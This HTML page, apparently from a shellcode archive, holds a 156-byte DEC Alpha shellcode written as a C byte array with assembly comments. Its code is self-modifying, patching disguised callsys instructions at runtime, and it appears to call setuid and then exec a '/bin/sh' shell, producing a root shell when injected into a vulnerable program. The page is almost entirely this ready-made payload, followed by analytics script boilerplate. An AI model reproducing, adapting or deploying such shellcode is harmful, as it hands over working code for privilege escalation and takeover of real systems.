<html><head><title>Alpha - setuid() - 156 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
char shellcode[]=
        &quot;\x30\x15\xd9\x43&quot;      /* subq $30,200,$16             */
        &quot;\x11\x74\xf0\x47&quot;      /* bis $31,0x83,$17             */
        &quot;\x12\x14\x02\x42&quot;      /* addq $16,16,$18              */
        &quot;\xfc\xff\x32\xb2&quot;      /* stl $17,-4($18)              */
        &quot;\x12\x94\x09\x42&quot;      /* addq $16,76,$18              */
        &quot;\xfc\xff\x32\xb2&quot;      /* stl $17,-4($18)              */
        &quot;\xff\x47\x3f\x26&quot;      /* ldah $17,0x47ff($31)         */
        &quot;\x12\x14\x02\x42&quot;      /* addq $16,16,$18              */
        &quot;\xfc\xff\x32\xb2&quot;      /* stl $17,-4($18)              */
        &quot;\x12\x94\x09\x42&quot;      /* addq $16,76,$18              */
        &quot;\xfc\xff\x32\xb2&quot;      /* stl $17,-4($18)              */
        &quot;\xff\x47\x3f\x26&quot;      /* ldah $17,0x47ff($31)         */
        &quot;\x1f\x04\x31\x22&quot;      /* lda $17,0x041f($17)          */
        &quot;\xfc\xff\x30\xb2&quot;      /* stl $17,-4($16)              */
        &quot;\xf7\xff\x1f\xd2&quot;      /* bsr $16,-32                  */
        &quot;\x10\x04\xff\x47&quot;      /* clr $16                      */
        &quot;\x11\x14\xe3\x43&quot;      /* addq $31,24,$17              */
        &quot;\x20\x35\x20\x42&quot;      /* subq $17,1,$0                */
        &quot;\xff\xff\xff\xff&quot;      /* callsys ( disguised )        */
        &quot;\x30\x15\xd9\x43&quot;      /* subq $30,200,$16             */
        &quot;\x31\x15\xd8\x43&quot;      /* subq $30,192,$17             */
        &quot;\x12\x04\xff\x47&quot;      /* clr $18                      */
        &quot;\x40\xff\x1e\xb6&quot;      /* stq $16,-192($30)            */
        &quot;\x48\xff\xfe\xb7&quot;      /* stq $31,-184($30)            */
        &quot;\x98\xff\x7f\x26&quot;      /* ldah $19,0xff98($31)         */
        &quot;\xd0\x8c\x73\x22&quot;      /* lda $19,0x8cd0($19)          */
        &quot;\x13\x05\xf3\x47&quot;      /* ornot $31,$19,$19            */
        &quot;\x3c\xff\x7e\xb2&quot;      /* stl $19,-196($30)            */
        &quot;\x69\x6e\x7f\x26&quot;      /* ldah $19,0x6e69($31)         */
        &quot;\x2f\x62\x73\x22&quot;      /* lda $19,0x622f($19)          */
        &quot;\xd0\x8c\x73\x22&quot;      /* lda $19,0x8cd0($19)          */
        &quot;\x13\x05\xf3\x47&quot;      /* ornot $31,$19,$19            */
        &quot;\x3c\xff\x7e\xb2&quot;      /* stl $19,-196($30)            */
        &quot;\x69\x6e\x7f\x26&quot;      /* ldah $19,0x6e69($31)         */
        &quot;\x2f\x62\x73\x22&quot;      /* lda $19,0x622f($19)          */
        &quot;\x38\xff\x7e\xb2&quot;      /* stl $19,-200($30)            */
        &quot;\x13\x94\xe7\x43&quot;      /* addq $31,60,$19              */
        &quot;\x20\x35\x60\x42&quot;      /* subq $19,1,$0                */
        &quot;\xff\xff\xff\xff&quot;;     /* callsys ( disguised )        */


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
